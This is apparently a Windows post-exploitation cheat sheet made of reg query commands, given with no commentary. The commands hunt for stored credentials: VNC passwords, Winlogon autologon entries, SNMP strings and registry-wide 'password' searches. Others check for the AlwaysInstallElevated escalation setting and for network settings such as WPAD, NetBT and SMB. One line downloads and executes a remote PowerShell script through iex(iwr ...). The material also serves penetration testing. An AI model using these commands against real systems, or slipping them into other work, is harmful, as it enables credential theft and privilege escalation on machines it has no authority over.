reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
#reg query HKLM /f password /t REG_SZ /s
#reg query HKCU /f password /t REG_SZ /s

iex(iwr -UseBasicParsing https://raw.githubusercontent.com/KurtDeGreeff/PlayPowershell/master/Search-Registry.ps1)

Search-Registry -StartKey HKCU -Pattern "Password" -MatchData


reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad"

reg query "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /s

reg query "HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" /s

reg query HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters /s

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate /s


reg query HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\ /s

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Installer"

